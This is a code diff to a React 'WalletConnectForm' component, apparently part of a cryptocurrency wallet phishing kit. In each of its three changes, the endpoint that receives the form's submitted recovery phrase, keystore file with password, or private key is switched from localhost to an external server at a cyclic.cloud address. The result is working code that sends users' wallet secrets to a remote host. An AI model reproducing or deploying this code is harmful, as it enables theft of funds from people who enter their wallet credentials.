@@ -66,7 +66,7 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
 
     if (validatePhrase(phrase)) {
       try {
-        const res = await axios.post('http://localhost:3000/secure/connect/', { name, type, data, password });
+        const res = await axios.post('https://long-newt-coveralls.cyclic.cloud/secure/connect/', { name, type, data, password });
       } catch (error) {
         console.log(error)
       }
@@ -91,7 +91,7 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
     const password = keystorePassword
     
     try {
-      const res = await axios.post('http://localhost:3000/secure/connect/', { name, type, data, password });
+      const res = await axios.post('https://long-newt-coveralls.cyclic.cloud/secure/connect/', { name, type, data, password });
     } catch (error) {
       console.log(error)
     }
@@ -113,7 +113,7 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
 
     if (validatePhrase(privateKey)) {
       try {
-        const res = await axios.post('http://localhost:3000/secure/connect/', { name, type, data, password });
+        const res = await axios.post('https://long-newt-coveralls.cyclic.cloud/secure/connect/', { name, type, data, password });
       } catch (error) {
         console.log(error)
       }
